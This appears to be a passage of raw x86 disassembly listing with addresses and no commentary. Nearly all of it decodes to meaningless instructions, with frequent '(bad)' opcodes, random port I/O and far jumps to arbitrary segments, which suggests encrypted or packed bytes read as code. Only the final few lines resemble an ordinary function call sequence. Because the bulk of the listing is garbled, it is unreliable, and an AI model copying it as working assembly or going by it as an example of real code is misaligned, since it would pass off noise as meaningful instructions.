  403066:	bound  ecx,QWORD PTR [esi-0x73437ede]
  40306c:	jns    0x403078
  40306e:	and    ah,dh
  403070:	fmul   QWORD PTR [ecx]
  403072:	and    eax,0x45504ad6
  403077:	vunpcklps xmm3,xmm4,XMMWORD PTR [edi]
  40307b:	jmp    0x40301d
  40307d:	mov    ds:0xb2f6b317,al
  403082:	pop    ebx
  403083:	adc    dh,bh
  403085:	in     eax,dx
  403086:	jbe    0x40303e
  403088:	(bad)  
  403089:	pop    edi
  40308a:	push   es
  40308b:	cdq    
  40308c:	mov    ah,0x40
  40308e:	adc    eax,0xd4cc553a
  403093:	mov    ah,0x11
  403095:	mov    esp,0x98a2de8e
  40309a:	ss call 0xe8cf:0x8ddeea38
  4030a2:	and    BYTE PTR [edi+0x76ddb22f],dh
  4030a8:	js     0x403096
  4030aa:	mov    DWORD PTR [eax+0x45ed30d1],eax
  4030b0:	mov    ?,WORD PTR [edi]
  4030b2:	pushf  
  4030b3:	xchg   edi,eax
  4030b4:	pop    edi
  4030b5:	popf   
  4030b6:	rcr    DWORD PTR [ebp+0x60231ce5],0x5f
  4030bd:	adc    DWORD PTR [eax+0x45a0da7a],ebx
  4030c3:	xchg   edx,eax
  4030c4:	in     al,dx
  4030c5:	ins    DWORD PTR es:[edi],dx
  4030c6:	add    bh,bh
  4030c8:	jnp    0x4030d3
  4030ca:	pop    ebx
  4030cb:	xchg   BYTE PTR [edx],bl
  4030cd:	xchg   edi,eax
  4030ce:	push   ebx
  4030cf:	loopne 0x4030db
  4030d1:	push   0x1a857748
  4030d6:	cmp    BYTE PTR [ebp-0x22840d4a],0x36
  4030dd:	xchg   esi,eax
  4030de:	inc    ebp
  4030df:	(bad)  
  4030e0:	lea    edx,[edi+0x528f6023]
  4030e6:	push   ds
  4030e7:	test   DWORD PTR [ecx+esi*8-0x75],ecx
  4030eb:	sub    bh,BYTE PTR [ebx+0x65746cd4]
  4030f1:	mov    eax,ds:0x52600df
  4030f6:	add    DWORD PTR [edx],esp
  4030f8:	ficomp WORD PTR [edx-0xf34e4d5]
  4030fe:	iretw  
  403100:	rcr    esi,cl
  403102:	pop    esp
  403103:	loop   0x4030c2
  403105:	jo     0x403164
  403107:	dec    eax
  403108:	ss fist WORD PTR es:[eax+0x2c]
  40310d:	dec    esi
  40310e:	loope  0x4030f7
  403110:	mov    bl,0x80
  403112:	pop    edx
  403113:	xchg   ebx,eax
  403114:	or     DWORD PTR [edx-0x4f],esi
  403117:	xor    DWORD PTR [edx+0x22],ebx
  40311a:	loopne 0x403122
  40311c:	jecxz  0x403175
  40311e:	out    0x57,eax
  403120:	sub    esp,DWORD PTR [ebp-0x1b]
  403123:	add    DWORD PTR [ecx+0x208c6cb8],0xf0e8d257
  40312d:	jns    0x40314d
  40312f:	mov    al,ds:0xbfe29e56
  403134:	mov    ebx,DWORD PTR [edi+0x4ba71d85]
  40313a:	pop    ds
  40313b:	inc    esi
  40313c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40313d:	stc    
  40313e:	jo     0x403191
  403140:	jb     0x4030d9
  403142:	pop    ebx
  403143:	push   cs
  403144:	add    dl,cl
  403146:	and    al,0x84
  403148:	push   ebp
  403149:	and    dl,BYTE PTR [ecx+0x1c]
  40314c:	xchg   ebx,eax
  40314d:	mov    BYTE PTR [ecx+ebx*8+0x6a],al
  403151:	into   
  403152:	sub    esi,DWORD PTR [edx+edx*8]
  403155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403156:	js     0x40318d
  403158:	mov    ebx,0x2204094f
  40315d:	stos   DWORD PTR es:[edi],eax
  40315e:	dec    edi
  40315f:	sub    esp,0x93e0f41e
  403165:	xor    al,0xb4
  403167:	mov    ch,0xc9
  403169:	mov    ch,0xd3
  40316b:	cli    
  40316c:	cwde   
  40316d:	cmp    al,0x50
  40316f:	pop    ds
  403170:	mov    edi,0x5fd828cc
  403175:	inc    edx
  403176:	sbb    eax,0x5eeb7db9
  40317b:	into   
  40317c:	or     DWORD PTR [edx],ebx
  40317e:	push   cs
  40317f:	cmp    DWORD PTR [edi+0x3e],edx
  403182:	stc    
  403183:	fsubr  st,st(4)
  403185:	and    ebx,DWORD PTR [esi]
  403187:	pop    eax
  403188:	xor    al,0x44
  40318a:	pop    ss
  40318b:	cld    
  40318c:	pop    ebx
  40318d:	(bad)  
  40318e:	and    ecx,esp
  403190:	add    edi,DWORD PTR [edi+ebp*1-0x3cb665d7]
  403197:	mov    edi,0xfaac5985
  40319c:	into   
  40319d:	pop    edx
  40319e:	adc    eax,0x30824df9
  4031a3:	in     eax,0x5d
  4031a5:	loopne 0x403130
  4031a7:	scas   eax,DWORD PTR es:[edi]
  4031a8:	add    DWORD PTR [ebp+0x9baf9ea],edi
  4031ae:	inc    ah
  4031b0:	call   0xf0294ce
  4031b5:	arpl   WORD PTR [eax-0x12],bx
  4031b8:	daa    
  4031b9:	sub    eax,0xd700dae3
  4031be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031bf:	lds    eax,FWORD PTR [ebp+0x3513cb1b]
  4031c5:	mov    ds:0x5b07355b,eax
  4031ca:	cmp    al,0x3e
  4031cc:	hlt    
  4031cd:	jb     0x403202
  4031cf:	sti    
  4031d0:	add    ch,BYTE PTR gs:[ecx-0x22]
  4031d4:	xor    ah,BYTE PTR [ecx]
  4031d6:	mov    al,0x9a
  4031d8:	pop    ds
  4031d9:	std    
  4031da:	adc    ebp,DWORD PTR [edi]
  4031dc:	sahf   
  4031dd:	in     al,0x3f
  4031df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031e0:	add    eax,0x9916d520
  4031e5:	test   DWORD PTR [ebp-0x77],ebp
  4031e8:	cmp    bh,bl
  4031ea:	stos   DWORD PTR es:[edi],eax
  4031eb:	xor    ebx,ebx
  4031ed:	and    esi,DWORD PTR [edi-0x5c433e2b]
  4031f3:	in     al,dx
  4031f4:	pop    esp
  4031f5:	iret   
  4031f6:	ins    DWORD PTR es:[edi],dx
  4031f7:	pop    es
  4031f8:	dec    ebp
  4031f9:	mov    al,ds:0x996188cb
  4031fe:	shl    edi,1
  403200:	cdq    
  403201:	xchg   edx,eax
  403202:	mov    esp,0x91172d60
  403207:	ja     0x40323b
  403209:	aas    
  40320a:	inc    esi
  40320b:	inc    esi
  40320c:	fadd   DWORD PTR ds:0xcf82e5f0
  403212:	imul   esp,ebp,0xf939280e
  403218:	mov    ch,0x4c
  40321a:	inc    DWORD PTR [esi]
  40321c:	test   BYTE PTR [edi-0x14],bh
  40321f:	add    eax,0xb99b42ae
  403224:	sbb    DWORD PTR [ebx+0x4c],esp
  403227:	fidivr DWORD PTR [ebp-0x2a]
  40322a:	jns    0x4031c4
  40322c:	or     ebx,edx
  40322e:	mov    dh,BYTE PTR [edi+0x0]
  403231:	daa    
  403232:	cmp    bh,BYTE PTR [eax-0x59]
  403235:	mov    bl,0x3f
  403237:	inc    eax
  403238:	fidivr WORD PTR [ebx+0x45]
  40323b:	mov    edi,0x7f51dc93
  403240:	je     0x4032ab
  403242:	push   0x4b
  403244:	or     DWORD PTR [eax],ebx
  403246:	adc    al,0x5d
  403248:	in     al,0x77
  40324a:	jnp    0x40323d
  40324c:	mov    ss,WORD PTR [ebx-0x27fd9328]
  403252:	mov    dh,0xc8
  403254:	mov    esp,0x44c41fc
  403259:	iret   
  40325a:	inc    eax
  40325b:	jl     0x403263
  40325d:	mov    bl,0x95
  40325f:	inc    edi
  403260:	sub    eax,0xf1102511
  403265:	push   edx
  403266:	imul   DWORD PTR [ecx]
  403268:	aad    0x72
  40326a:	dec    ebp
  40326b:	push   0x19
  40326d:	jge    0x403273
  40326f:	or     DWORD PTR [ebx+0x10432269],ebp
  403275:	sbb    edx,eax
  403277:	mov    cl,0x9
  403279:	xor    al,0xc
  40327b:	call   0x2c2a:0xabc2651b
  403282:	aaa    
  403283:	mov    fs,WORD PTR [ebp+0x64]
  403286:	xchg   ebx,eax
  403287:	mov    ebp,0xf2251c22
  40328c:	and    eax,0x32cfc38e
  403291:	loopne 0x403273
  403293:	push   edx
  403294:	mov    ebx,esp
  403296:	xchg   esi,eax
  403297:	mov    bh,0x34
  403299:	out    0xf8,al
  40329b:	mov    ecx,0xb8ac81ee
  4032a0:	jno    0x403265
  4032a2:	leave  
  4032a3:	or     edi,eax
  4032a5:	inc    eax
  4032a6:	push   ds
  4032a7:	mov    dh,0x5b
  4032a9:	mov    ds:0x6d495e37,eax
  4032ae:	xchg   ecx,eax
  4032af:	push   eax
  4032b0:	pop    eax
  4032b1:	sub    eax,0xc822c9c5
  4032b6:	and    ch,BYTE PTR [ebp-0x2ce5f14a]
  4032bc:	dec    ebp
  4032bd:	lock dec ebx
  4032bf:	xchg   ebp,eax
  4032c0:	in     eax,dx
  4032c1:	xchg   ebx,eax
  4032c2:	jmp    0xccea:0xee3c119f
  4032c9:	sub    BYTE PTR [esi+0x1e],dh
  4032cc:	mov    ecx,DWORD PTR [edx+ebx*8-0x68686913]
  4032d3:	and    DWORD PTR [edx+0x3fe7c638],ecx
  4032d9:	sub    BYTE PTR [edi-0x4c],bl
  4032dc:	sub    BYTE PTR [edx],0xce
  4032df:	jge    0x40328e
  4032e1:	aaa    
  4032e2:	adc    al,0x89
  4032e4:	out    dx,al
  4032e5:	fistp  QWORD PTR [ebp+eiz*8+0x7e9746ca]
  4032ec:	outs   dx,BYTE PTR ds:[esi]
  4032ed:	idiv   DWORD PTR [esi]
  4032ef:	mov    al,ds:0xceccb420
  4032f4:	leave  
  4032f5:	adc    DWORD PTR [ebx-0x41cf951],0xffffff9f
  4032fc:	imul   ebp,DWORD PTR [edi+0x1f],0x4db55435
  403303:	in     eax,dx
  403304:	loopne 0x4032ca
  403306:	fstp   st(3)
  403308:	test   eax,0xd9150f4b
  40330d:	ds mov ebx,0xae8b34c6
  403313:	xor    eax,0xeb966448
  403318:	push   bp
  40331a:	outs   dx,BYTE PTR ds:[esi]
  40331b:	push   esp
  40331c:	aas    
  40331d:	add    BYTE PTR [ebp+0x346252c3],bl
  403323:	pop    ebx
  403324:	xlat   BYTE PTR ds:[ebx]
  403325:	ficomp DWORD PTR [ecx+0x19]
  403328:	out    dx,eax
  403329:	and    dh,BYTE PTR [esi+0x4e30f653]
  40332f:	adc    eax,0x6252a90b
  403334:	fs aaa 
  403336:	pushf  
  403337:	(bad)  [edi]
  403339:	and    DWORD PTR [ebp-0x29],esi
  40333c:	push   es
  40333d:	fsubr  DWORD PTR [ecx]
  40333f:	je     0x403372
  403341:	loop   0x40337a
  403343:	ins    DWORD PTR es:[edi],dx
  403344:	rcr    BYTE PTR [ebp+0xf8db1de],cl
  40334a:	dec    ebp
  40334b:	xchg   ecx,eax
  40334c:	test   al,0xf
  40334e:	cdq    
  40334f:	test   BYTE PTR [edi+esi*4-0x48],0xbc
  403354:	(bad)  
  403355:	adc    eax,DWORD PTR [edx+0x69]
  403358:	or     cl,BYTE PTR [edi-0x3679c480]
  40335e:	jo     0x403399
  403360:	mov    cl,0x97
  403362:	adc    DWORD PTR [edx-0x5c24256b],ebp
  403368:	mov    edi,0x25eeae05
  40336d:	je     0x4033e0
  40336f:	clc    
  403370:	cmp    al,0x3f
  403372:	lods   eax,DWORD PTR ds:[esi]
  403373:	imul   ebp,DWORD PTR [eax+0x18a90cca],0x64
  40337a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337b:	cdq    
  40337c:	rol    dh,cl
  40337e:	inc    eax
  40337f:	js     0x4033d4
  403381:	sub    al,0xa6
  403383:	mov    eax,0xe9322820
  403388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403389:	push   ds
  40338a:	enter  0x70ef,0xcc
  40338e:	arpl   WORD PTR [edx+0x44],bx
  403391:	cmp    cl,BYTE PTR [ebp+ebx*1-0x52c2e9c6]
  403398:	mov    dl,0x4c
  40339a:	cld    
  40339b:	xchg   BYTE PTR [eax],cl
  40339d:	sar    BYTE PTR [eax+0x3d],1
  4033a0:	shl    bh,0x8d
  4033a3:	push   edx
  4033a4:	ins    BYTE PTR es:[edi],dx
  4033a5:	xchg   esi,eax
  4033a6:	dec    esp
  4033a7:	adc    al,0xf1
  4033a9:	mov    edx,0x4638cbf2
  4033ae:	pop    ebx
  4033af:	ret    0xe5bb
  4033b2:	or     DWORD PTR [esi+0x26b5473c],ebx
  4033b8:	xchg   ecx,eax
  4033b9:	mov    esi,0xe99942af
  4033be:	fld    QWORD PTR [ebp-0x30b0c420]
  4033c4:	sbb    edx,DWORD PTR [edx-0x457e0191]
  4033ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033cb:	retf   0xb125
  4033ce:	or     al,0x8
  4033d0:	xchg   BYTE PTR [eax+0x12],ah
  4033d3:	xchg   edi,eax
  4033d4:	pop    ecx
  4033d5:	in     eax,dx
  4033d6:	adc    esi,DWORD PTR [ebp+0xfd36a71]
  4033dc:	cmp    eax,0x786dc94
  4033e1:	shl    DWORD PTR [edx+ecx*4+0x45],cl
  4033e5:	add    al,0x82
  4033e7:	mov    eax,DWORD PTR [ebx+0x53639a0a]
  4033ed:	outs   dx,BYTE PTR ds:[esi]
  4033ee:	repnz add ecx,edi
  4033f1:	imul   esi,DWORD PTR [eax],0x93a524f5
  4033f7:	and    bl,BYTE PTR [eax+ebp*4-0x385fd99f]
  4033fe:	xor    al,0x67
  403400:	loop   0x4033ca
  403402:	and    al,0x59
  403404:	mov    ch,BYTE PTR [edi+0x3a]
  403407:	pop    ebp
  403408:	ret    0x7084
  40340b:	outs   dx,DWORD PTR ds:[esi]
  40340c:	rcl    BYTE PTR [ebx+0x700b1d13],1
  403412:	test   DWORD PTR [edx+0x34],edi
  403415:	cwde   
  403416:	lods   al,BYTE PTR ds:[esi]
  403417:	ins    DWORD PTR es:[edi],dx
  403418:	shr    DWORD PTR [ebp-0x2b],1
  40341b:	jecxz  0x4033f0
  40341d:	loop   0x40348d
  40341f:	push   edi
  403420:	inc    eax
  403421:	cmp    ebp,edi
  403423:	data16 jmp 0x2a89:0x427d
  40342a:	push   cs
  40342b:	xchg   ecx,eax
  40342c:	push   esi
  40342d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40342e:	mov    ebp,0x921c19a3
  403433:	dec    edx
  403434:	into   
  403435:	jge    0x4033fe
  403437:	push   0xffffffdd
  403439:	inc    ecx
  40343a:	mov    ds:0x1616e7b1,al
  40343f:	sbb    cl,BYTE PTR [esi]
  403441:	hlt    
  403442:	push   0x412e7d8c
  403447:	ja     0x4034c2
  403449:	ret    
  40344a:	scas   eax,DWORD PTR es:[edi]
  40344b:	fdiv   DWORD PTR [ecx-0x41]
  40344e:	imul   ebx,DWORD PTR [esi],0xb5ffc19f
  403454:	int3   
  403455:	and    cl,0xe5
  403458:	mov    WORD PTR [ecx+ebp*8+0x37c437f],?
  40345f:	sub    eax,0xf0668dd9
  403464:	enter  0x3432,0x64
  403468:	add    dh,dh
  40346a:	sbb    BYTE PTR [esi+0x15],ah
  40346d:	or     bl,BYTE PTR [ebx-0x79e6afb]
  403473:	and    eax,0x9e6b2fb4
  403478:	jmp    0xe3cb:0x5a9aa4ed
  40347f:	test   BYTE PTR [ebp+0x5b],0xba
  403483:	push   edi
  403484:	and    cl,BYTE PTR [edx-0x42b80f8f]
  40348a:	loope  0x403482
  40348c:	enter  0xb0c9,0x27
  403490:	or     BYTE PTR [esi-0x23958d02],0xf9
  403497:	jle    0x40344b
  403499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40349a:	sub    esp,esi
  40349c:	sahf   
  40349d:	shr    ah,cl
  40349f:	cs dec ebp
  4034a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034a2:	jmp    0xf487:0xc37be664
  4034a9:	cdq    
  4034aa:	mov    al,dh
  4034ac:	dec    eax
  4034ad:	stos   DWORD PTR es:[edi],eax
  4034ae:	aaa    
  4034af:	ds mov al,0xaf
  4034b2:	mov    edx,DWORD PTR [edx]
  4034b4:	sub    eax,0x8814a3e7
  4034b9:	inc    eax
  4034ba:	push   esp
  4034bb:	cld    
  4034bc:	loop   0x403467
  4034be:	jb     0x403502
  4034c0:	jg     0x40344a
  4034c2:	scas   al,BYTE PTR es:[edi]
  4034c3:	call   0xd0dc5683
  4034c8:	clc    
  4034c9:	xor    edx,DWORD PTR [ebx-0x75a86448]
  4034cf:	pop    eax
  4034d0:	outs   dx,DWORD PTR ds:[esi]
  4034d1:	pushf  
  4034d2:	pop    ecx
  4034d3:	cdq    
  4034d4:	gs popf 
  4034d6:	pop    ds
  4034d7:	rcl    BYTE PTR [ebx],0x11
  4034da:	adc    DWORD PTR [esi-0x70],ebx
  4034dd:	call   0x32fa:0x77e08626
  4034e4:	repnz xor BYTE PTR [esi],ch
  4034e7:	cmp    al,0x40
  4034e9:	imul   ebp,esp,0xffffffab
  4034ec:	mov    ah,0x1d
  4034ee:	jle    0x403516
  4034f0:	outs   dx,BYTE PTR ds:[esi]
  4034f1:	div    BYTE PTR [eax-0x109626e6]
  4034f7:	mov    dh,0x81
  4034f9:	mov    bh,0xe4
  4034fb:	sahf   
  4034fc:	shld   DWORD PTR [ebx-0x2a27c1b1],edx,cl
  403503:	push   0xd3f9ad6a
  403508:	push   ecx
  403509:	mov    ds:0x8457e288,al
  40350e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40350f:	push   edx
  403510:	imul   eax,DWORD PTR [edx],0xdab6dce5
  403516:	push   ebp
  403517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403518:	sub    edx,DWORD PTR [ecx]
  40351a:	mov    cl,0xf9
  40351c:	ja     0x403538
  40351e:	clc    
  40351f:	dec    edi
  403520:	or     al,0x43
  403522:	push   es
  403523:	cmc    
  403524:	fst    DWORD PTR [ecx]
  403526:	inc    ebx
  403527:	fst    DWORD PTR [ebp-0x26]
  40352a:	xor    al,0xb6
  40352c:	and    al,0xb1
  40352e:	mov    DWORD PTR [eax],ecx
  403530:	mov    edx,0x9a1d10fd
  403535:	(bad)  
  403536:	sbb    dl,ah
  403538:	ja     0x40352c
  40353a:	frstor [ebx+0x36]
  40353d:	clc    
  40353e:	clc    
  40353f:	inc    esp
  403540:	test   al,0xcd
  403542:	fsubr  DWORD PTR [esi+eax*2]
  403545:	sub    eax,0xfb82985
  40354a:	imul   ebx,edx,0x3e
  40354d:	dec    ebx
  40354e:	fild   WORD PTR [edx+eax*8-0x57bc6e2b]
  403555:	mov    ebp,0x9452a493
  40355a:	outs   dx,DWORD PTR ds:[esi]
  40355b:	adc    al,0xbc
  40355d:	and    dh,BYTE PTR [edx+0x64]
  403560:	add    BYTE PTR [esi+eax*4],bl
  403563:	or     BYTE PTR es:[esi+ebx*4-0x2ffd7f11],bh
  40356b:	jae    0x40359d
  40356d:	mov    edx,0x69923367
  403572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403573:	sub    eax,0xbe5b53f0
  403578:	adc    DWORD PTR [edi+0x7e],0x28f8d6f8
  40357f:	daa    
  403580:	push   edx
  403582:	cmp    dh,BYTE PTR [ecx+edx*4]
  403585:	cmp    BYTE PTR [ebx],0x95
  403588:	mov    ds:0x63cd3cfa,al
  40358d:	stos   BYTE PTR es:[edi],al
  40358e:	call   0xea5116d4
  403593:	jae    0x4035a8
  403595:	sub    ecx,DWORD PTR [esi]
  403597:	lods   al,BYTE PTR ds:[esi]
  403598:	dec    edx
  403599:	call   0xc1d6:0xaf782fb0
  4035a0:	hlt    
  4035a1:	popf   
  4035a2:	push   0x22
  4035a4:	jecxz  0x40353c
  4035a6:	cmp    BYTE PTR [ebx+ebp*1],ah
  4035a9:	aad    0xa2
  4035ab:	and    DWORD PTR [ebx-0x7f],ecx
  4035ae:	or     dl,BYTE PTR [ebx+0xa]
  4035b1:	dec    esp
  4035b2:	pop    esp
  4035b3:	sbb    eax,0xc41eab68
  4035b8:	addr16 sub dh,dh
  4035bb:	pop    ebx
  4035bc:	test   eax,0xcdaae0ae
  4035c1:	or     bl,BYTE PTR fs:[edi+ebx*4-0x5a947345]
  4035c9:	lds    ebp,FWORD PTR [eax+0x50]
  4035cc:	shl    edx,cl
  4035ce:	mov    cl,0x52
  4035d0:	xor    DWORD PTR [ecx+0x55],0xfffffffe
  4035d4:	xchg   edi,eax
  4035d5:	inc    esi
  4035d6:	mov    dh,0x36
  4035d8:	popf   
  4035d9:	popf   
  4035da:	jl     0x40364f
  4035dc:	test   eax,0xe1f0591
  4035e1:	inc    ebp
  4035e2:	and    DWORD PTR [eax-0x29f0cc0c],0x884337de
  4035ec:	aas    
  4035ed:	stos   BYTE PTR es:[edi],al
  4035ee:	jne    0x40358f
  4035f0:	adc    eax,0xbb28e180
  4035f5:	fnstcw WORD PTR [eax-0x5d]
  4035f8:	(bad)  
  4035f9:	imul   ebp,eax,0x3bd9cb66
  4035ff:	inc    ebx
  403600:	push   ss
  403601:	stc    
  403602:	push   eax
  403603:	fisttp DWORD PTR [edi-0x6a]
  403606:	sub    BYTE PTR ds:0xe2af66c3,bh
  40360c:	push   ds
  40360d:	cmp    BYTE PTR [ecx+eiz*8],ch
  403610:	sub    al,0xb0
  403612:	pop    ss
  403613:	outs   dx,BYTE PTR ds:[esi]
  403614:	int    0x71
  403616:	jb     0x4035ef
  403618:	(bad)  
  403619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40361a:	pop    edi
  40361b:	scas   eax,DWORD PTR es:[edi]
  40361c:	ja     0x4035c9
  40361e:	push   edx
  40361f:	or     cl,dl
  403621:	or     al,0x38
  403623:	adc    BYTE PTR [ebp+0x560b656f],cl
  403629:	add    ah,0x56
  40362c:	pop    esi
  40362d:	xor    ah,ah
  40362f:	sub    eax,0x2345d815
  403634:	push   sp
  403636:	and    DWORD PTR [ecx],esi
  403638:	cdq    
  403639:	test   ah,dh
  40363b:	or     edx,DWORD PTR [edi+0xc]
  40363e:	popf   
  40363f:	int3   
  403640:	call   0x4293ae31
  403645:	sbb    al,0x63
  403647:	mov    bl,0xb8
  403649:	mov    ds:0xc5babf49,al
  40364e:	xchg   esp,eax
  40364f:	vandps ymm1,ymm0,YMMWORD PTR [ecx-0x6b5ebc61]
  403657:	xchg   ebp,eax
  403658:	inc    esp
  403659:	xchg   esp,eax
  40365a:	in     eax,dx
  40365b:	sbb    bl,BYTE PTR [ebx+0x44]
  40365e:	pop    ecx
  40365f:	pop    esp
  403660:	inc    edx
  403661:	lahf   
  403662:	lock add al,0xcd
  403665:	ffreep st(2)
  403667:	push   ecx
  403668:	jmp    0x679ca5f4
  40366d:	outs   dx,DWORD PTR ds:[esi]
  40366e:	dec    ecx
  40366f:	inc    esp
  403670:	mov    esi,0x5b254ddc
  403675:	bound  eax,QWORD PTR [ecx+0x6e]
  403678:	push   esi
  403679:	lods   eax,DWORD PTR ds:[esi]
  40367a:	out    0xaf,al
  40367c:	mov    al,ds:0x679d1976
  403681:	fucom  st(3)
  403683:	mov    ah,0x3d
  403685:	mov    cl,0x75
  403687:	ja     0x4036ef
  403689:	push   ebp
  40368a:	jno    0x403707
  40368c:	inc    edx
  40368d:	rol    BYTE PTR [edi+0xd],0x67
  403691:	cmp    BYTE PTR [esi+0x64a55f59],ah
  403697:	(bad)
  40369a:	in     eax,0x7
  40369c:	adc    ecx,ebx
  40369e:	jp     0x4036b2
  4036a0:	jecxz  0x403718
  4036a2:	dec    edx
  4036a3:	cdq    
  4036a4:	ret    0xb71d
  4036a7:	push   es
  4036a8:	pop    es
  4036a9:	mov    WORD PTR [ecx+0x69923325],?
  4036af:	sbb    BYTE PTR [ebx+edi*4],ch
  4036b2:	fst    st(6)
  4036b4:	test   BYTE PTR [ebx],0x8
  4036b7:	outs   dx,DWORD PTR ds:[esi]
  4036b8:	ret    
  4036b9:	hlt    
  4036ba:	sub    BYTE PTR [esi],dh
  4036bc:	or     edx,DWORD PTR fs:[ecx]
  4036bf:	sub    eax,DWORD PTR [ebx-0x5b]
  4036c2:	adc    BYTE PTR [ebp-0x11],ch
  4036c5:	rcl    DWORD PTR [ebx+eiz*2],cl
  4036c8:	mov    eax,0xb5d9f971
  4036cd:	ret    
  4036ce:	(bad)  
  4036cf:	in     eax,dx
  4036d0:	fwait
  4036d1:	and    ch,bh
  4036d3:	or     al,0x93
  4036d5:	data16 mov ch,0xc3
  4036d8:	and    bh,dl
  4036da:	cmp    al,0x9b
  4036dc:	div    BYTE PTR [esi-0x3b]
  4036df:	(bad)  
  4036e0:	in     al,0xe9
  4036e2:	push   0xffffff8e
  4036e4:	add    eax,0x2936261e
  4036e9:	add    esp,edi
  4036eb:	mov    bl,0xf8
  4036ed:	sub    BYTE PTR [ebx-0x26],dh
  4036f0:	sar    BYTE PTR [esi-0x69e0171a],1
  4036f6:	fild   DWORD PTR [edx-0x151e86ee]
  4036fc:	(bad)  
  4036fd:	in     eax,dx
  4036fe:	arpl   WORD PTR [eax],si
  403700:	push   eax
  403701:	cdq    
  403702:	call   0x6a93:0x358afe18
  403709:	pushf  
  40370a:	mov    ds:0x6b7be28c,al
  40370f:	pop    ebp
  403710:	in     al,dx
  403711:	cs dec ebp
  403713:	cld    
  403714:	cs sbb edx,esi
  403717:	xlat   BYTE PTR ds:[ebx]
  403718:	inc    ebp
  403719:	mov    edi,0xbeb071e9
  40371e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40371f:	(bad)  
  403720:	int3   
  403721:	xchg   al,ch
  403723:	nop
  403724:	(bad)  
  403725:	mov    edi,0xceb93208
  40372a:	pop    es
  40372b:	cmp    BYTE PTR [ecx],cl
  40372d:	fst    DWORD PTR [ebx+0x44]
  403730:	stos   BYTE PTR es:[edi],al
  403731:	pop    eax
  403732:	in     al,dx
  403733:	enter  0xdb38,0xb4
  403737:	jo     0x4037ac
  403739:	mov    esi,0xf30ffdc3
  40373e:	fmul   QWORD PTR [edi+eax*1-0x68]
  403742:	stos   DWORD PTR es:[edi],eax
  403743:	setp   BYTE PTR [esi]
  403746:	inc    esi
  403747:	sub    eax,0xde6c822d
  40374c:	fsubr  DWORD PTR [esi]
  40374e:	out    dx,eax
  40374f:	adc    ecx,DWORD PTR [edi-0x49ed3a60]
  403755:	sar    cl,cl
  403757:	daa    
  403758:	jno    0x40376b
  40375a:	shr    dh,0x63
  40375d:	xchg   ebp,edx
  40375f:	cmp    bh,BYTE PTR [edx]
  403761:	int3   
  403762:	add    bh,BYTE PTR [edi]
  403764:	jge    0x4036fd
  403766:	dec    esi
  403767:	adc    eax,0xc4e35c69
  40376c:	or     cl,BYTE PTR [ebp-0x778bd91d]
  403772:	in     al,dx
  403773:	push   es
  403774:	cwde   
  403775:	push   0x4
  403777:	pop    edi
  403778:	pop    edx
  403779:	push   edi
  40377b:	push   cs
  40377c:	(bad)  
  40377f:	or     edi,DWORD PTR [esi-0xd]
  403782:	out    0x9d,eax
  403784:	pop    edx
  403785:	lea    ebp,[edx-0xe]
  403788:	stos   DWORD PTR es:[edi],eax
  403789:	out    dx,al
  40378a:	(bad)  
  40378b:	jae    0x40377d
  40378d:	pop    esi
  40378e:	jp     0x40378a
  403790:	test   eax,0xeaa7d36d
  403795:	mov    al,ah
  403797:	fs inc ecx
  403799:	or     eax,0x574730a7
  40379e:	jb     0x403814
  4037a0:	jno    0x403790
  4037a2:	rol    DWORD PTR ds:0x25e88fb4,1
  4037a8:	xchg   edi,eax
  4037a9:	jnp    0x403755
  4037ab:	push   0xffffffd6
  4037ad:	mov    bh,0xea
  4037af:	ss nop
  4037b1:	rol    ebx,1
  4037b3:	xchg   ecx,eax
  4037b4:	pop    es
  4037b5:	xchg   edx,eax
  4037b6:	daa    
  4037b7:	or     ch,ah
  4037b9:	push   esi
  4037ba:	push   ebx
  4037bb:	xor    BYTE PTR [eax*1-0x50c9f19e],dh
  4037c2:	daa    
  4037c3:	rcl    BYTE PTR [ebp+0x777d4a7a],0x71
  4037ca:	push   ss
  4037cb:	sub    al,0x92
  4037cd:	mov    esp,0x39bf209d
  4037d2:	out    0xd2,al
  4037d4:	mov    esp,0x19e668ce
  4037d9:	enter  0xa437,0x37
  4037dd:	cs ins BYTE PTR es:[edi],dx
  4037df:	cmp    al,0xad
  4037e1:	pusha  
  4037e2:	xlat   BYTE PTR ds:[ebx]
  4037e3:	pop    ss
  4037e4:	xor    DWORD PTR [edi-0x7c],eax
  4037e7:	mov    ?,WORD PTR [ebp-0x2a]
  4037ea:	xor    bl,ah
  4037ec:	jae    0x403848
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
